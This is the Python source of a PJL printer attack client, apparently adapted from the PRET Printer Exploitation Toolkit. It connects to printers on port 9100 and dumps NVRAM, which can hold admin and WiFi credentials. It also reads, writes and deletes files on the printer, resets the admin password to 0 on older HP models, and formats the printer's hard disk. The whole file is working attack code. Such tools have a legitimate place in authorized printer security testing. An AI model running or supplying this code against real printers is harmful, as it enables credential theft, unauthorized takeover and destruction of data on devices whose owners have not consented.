"""
PRET Engine — PJL (Printer Job Language) Attack Suite
Full PJL attack implementation absorbed from PRET (Printer Exploitation Toolkit).

# Original: https://github.com/RUB-NDS/PRET (GPL-2.0)
# Authors: Jens Müller, Juraj Somorovsky, Vladislav Mladenov (Ruhr-Universität Bochum)
# Absorbed natively into PrinterXPL-Forge as pret_engine/pjl.py

PJL (Printer Job Language) — HP proprietary protocol, widely adopted.
Operates over port 9100 (JetDirect/AppSocket) or other print protocols.
Most printers have NO authentication for PJL commands.

Capabilities:
  - Info enumeration (model, firmware, variables, config)
  - Filesystem access (read/write/list/delete)
  - NVRAM dump (may contain admin credentials, WiFi passwords)
  - Display message manipulation
  - Remote reset/restart
  - Admin password override (pre-2015 HP models)
  - Disk erasure (DoS via HDDFORMAT)
"""

import logging
import socket
import time
from dataclasses import dataclass, field
from typing import Optional
from collections.abc import Generator

log = logging.getLogger(__name__)

JETDIRECT_PORT = 9100


def _encode_pjl(cmd: str) -> bytes:
    return f"\x1b%-12345X@PJL {cmd}\r\n\x1b%-12345X".encode("latin-1", errors="replace")


def _encode_pjl_raw(cmd: str) -> bytes:
    """Send PJL without the PCL escape wrapper (for mid-session commands)."""
    return f"@PJL {cmd}\r\n".encode("latin-1", errors="replace")


@dataclass
class PJLResult:
    command: str = ""
    response: str = ""
    success: bool = False
    error: str = ""


class PJLClient:
    """
    PJL attack client for HP and compatible printers (port 9100).
    Implements all PRET PJL capabilities natively.
    """

    TIMEOUT_BANNER  = 3.0
    TIMEOUT_COMMAND = 8.0
    TIMEOUT_UPLOAD  = 30.0

    def __init__(self, host: str, port: int = JETDIRECT_PORT, timeout: float = 10.0):
        self.host = host
        self.port = port
        self.timeout = timeout
        self._sock: socket.socket | None = None

    def connect(self) -> bool:
        try:
            self._sock = socket.create_connection((self.host, self.port), timeout=self.timeout)
            self._sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            return True
        except Exception as exc:
            log.debug("PJL connect %s:%d: %s", self.host, self.port, exc)
            return False

    def disconnect(self):
        if self._sock:
            try:
                self._sock.close()
            except Exception:
                pass
            self._sock = None

    def __enter__(self):
        self.connect()
        return self

    def __exit__(self, *args):
        self.disconnect()

    def _send(self, data: bytes) -> bool:
        if not self._sock:
            return False
        try:
            self._sock.sendall(data)
            return True
        except Exception as exc:
            log.debug("PJL send: %s", exc)
            return False

    def _recv(self, timeout: float = None) -> str:
        if not self._sock:
            return ""
        old_timeout = self._sock.gettimeout()
        self._sock.settimeout(timeout or self.TIMEOUT_COMMAND)
        chunks = []
        try:
            while True:
                chunk = self._sock.recv(4096)
                if not chunk:
                    break
                chunks.append(chunk)
                text = b"".join(chunks).decode("latin-1", errors="replace")
                if "\x0c" in text or "\n\r\n" in text or (len(text) > 3 and text.endswith("\r\n")):
                    break
        except TimeoutError:
            pass
        except Exception as exc:
            log.debug("PJL recv: %s", exc)
        finally:
            self._sock.settimeout(old_timeout)
        return b"".join(chunks).decode("latin-1", errors="replace")

    def _pjl_cmd(self, cmd: str, expect_response: bool = True) -> PJLResult:
        result = PJLResult(command=cmd)
        if not self._send(_encode_pjl(cmd)):
            result.error = "Send failed"
            return result
        if expect_response:
            result.response = self._recv()
            result.success = bool(result.response)
        else:
            result.success = True
        return result

    # ────────────────────────────────────── info commands

    def info_id(self) -> str:
        """@PJL INFO ID — printer model identifier."""
        r = self._pjl_cmd("INFO ID")
        return r.response.strip()

    def info_status(self) -> str:
        """@PJL INFO STATUS — current printer status."""
        r = self._pjl_cmd("INFO STATUS")
        return r.response.strip()

    def info_variables(self) -> dict[str, str]:
        """@PJL INFO VARIABLES — all PJL environment variables."""
        r = self._pjl_cmd("INFO VARIABLES")
        result = {}
        for line in r.response.splitlines():
            if "=" in line:
                k, _, v = line.partition("=")
                result[k.strip()] = v.strip().strip('"')
        return result

    def info_config(self) -> str:
        """@PJL INFO CONFIG — printer configuration."""
        r = self._pjl_cmd("INFO CONFIG")
        return r.response

    def getenv(self, variable: str) -> str:
        """@PJL GETENV <variable> — read environment variable."""
        r = self._pjl_cmd(f'GETENV {variable}')
        return r.response.strip()

    def nvram_dump(self) -> str:
        """
        @PJL NVRAM DUMP — full NVRAM dump.
        May contain: admin password, WiFi credentials, stored credentials.
        """
        r = self._pjl_cmd("NVRAM DUMP")
        return r.response

    # ────────────────────────────────────── filesystem commands

    def fsdirlist(self, path: str = "0:\\") -> list[str]:
        """@PJL FSDIRLIST — list directory contents."""
        cmd = f'FSDIRLIST NAME="{path}" ENTRY=1 COUNT=99'
        r = self._pjl_cmd(cmd)
        entries = []
        for line in r.response.splitlines():
            line = line.strip()
            if line and not line.startswith("@PJL") and not line.startswith("FSDIRLIST"):
                entries.append(line)
        return entries

    def fsupload(self, remote_path: str) -> bytes:
        """
        @PJL FSUPLOAD — read a file from the printer filesystem.
        Can read: config files, address books, stored credentials, job logs.
        """
        cmd = f'FSUPLOAD FORMAT:BINARY NAME="{remote_path}"'
        if not self._send(_encode_pjl(cmd)):
            return b""
        raw = b""
        self._sock.settimeout(self.TIMEOUT_COMMAND)
        try:
            while True:
                chunk = self._sock.recv(8192)
                if not chunk:
                    break
                raw += chunk
        except TimeoutError:
            pass
        # Strip PJL response header
        if b"FSUPLOAD" in raw:
            start = raw.find(b"\n", raw.find(b"FSUPLOAD")) + 1
            if b"\n" in raw[start:start + 10]:
                start = raw.find(b"\n", start) + 1
            return raw[start:]
        return raw

    def fsdownload(self, remote_path: str, content: bytes) -> bool:
        """
        @PJL FSDOWNLOAD — write a file to the printer filesystem.
        Can write: config files, PostScript files, malicious jobs.
        """
        cmd = f'FSDOWNLOAD FORMAT:BINARY SIZE={len(content)} NAME="{remote_path}"\r\n'
        full = _encode_pjl(cmd)[:-len(_encode_pjl(""))].rstrip() + b"\r\n" + content
        return self._send(full)

    def fsmkdir(self, path: str) -> bool:
        """Create a directory on the printer filesystem."""
        return self._pjl_cmd(f'FSMKDIR NAME="{path}"').success

    def fsdelete(self, path: str) -> bool:
        """Delete a file from the printer filesystem."""
        return self._pjl_cmd(f'FSDELETE NAME="{path}"').success

    # ────────────────────────────────────── control commands

    def display_message(self, message: str) -> bool:
        """@PJL RDYMSG DISPLAY — set the front panel LCD message."""
        return self._pjl_cmd(f'RDYMSG DISPLAY="{message[:16]}"', False).success

    def reset(self) -> bool:
        """@PJL RESET — reset the printer."""
        return self._pjl_cmd("RESET", False).success

    def set_default(self, variable: str, value) -> bool:
        """@PJL DEFAULT — set a persistent default variable."""
        return self._pjl_cmd(f'DEFAULT {variable}={value}', False).success

    def override_password(self) -> bool:
        """
        @PJL DEFAULT PASSWORD=0 — reset admin password to 0 on vulnerable HP models.
        Works on HP LaserJet pre-2015 firmware.
        """
        return self.set_default("PASSWORD", 0)

    def hdd_format(self) -> bool:
        """
        @PJL HDDFORMAT — erase the printer hard disk.
        DESTRUCTIVE — use only in authorized assessments.
        """
        return self._pjl_cmd("HDDFORMAT", False).success

    # ────────────────────────────────────── full scan

    def full_info_dump(self) -> dict:
        """Enumerate all available information from the printer."""
        return {
            "id": self.info_id(),
            "status": self.info_status(),
            "config": self.info_config()[:2000],
            "variables": self.info_variables(),
            "nvram": self.nvram_dump()[:500],
            "filesystem_root": self.fsdirlist("0:\\")[:20],
        }


if __name__ == "__main__":
    import sys
    import json
    logging.basicConfig(level=logging.INFO)
    host = sys.argv[1] if len(sys.argv) > 1 else "192.168.1.100"
    with PJLClient(host) as c:
        print(json.dumps(c.full_info_dump(), indent=2, default=str))
